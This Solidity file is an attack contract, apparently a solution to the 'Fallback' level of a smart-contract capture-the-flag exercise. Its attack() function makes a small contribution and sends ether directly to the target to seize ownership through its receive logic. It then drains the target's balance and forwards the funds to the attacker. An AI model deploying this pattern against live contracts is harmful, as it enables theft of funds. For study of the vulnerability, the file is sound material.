// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Fallback.sol";
import  {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";

contract Hack is Ownable(msg.sender) {
    Fallback public target;

    constructor(address _target) {
        target = Fallback(payable(_target));
    }

    function attack() public payable onlyOwner {
        require(msg.value < 0.001 ether, "Contribution too high");
        target.contribute{value: 100}();

        require(target.getContribution() > 0);

        (bool success, ) = address(target).call{value: 100}("");
        require(success, "Call failed");
        
        target.withdraw();
    }

    function withdraw() public onlyOwner {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Withdraw failed");
    }

    receive() external payable {}
}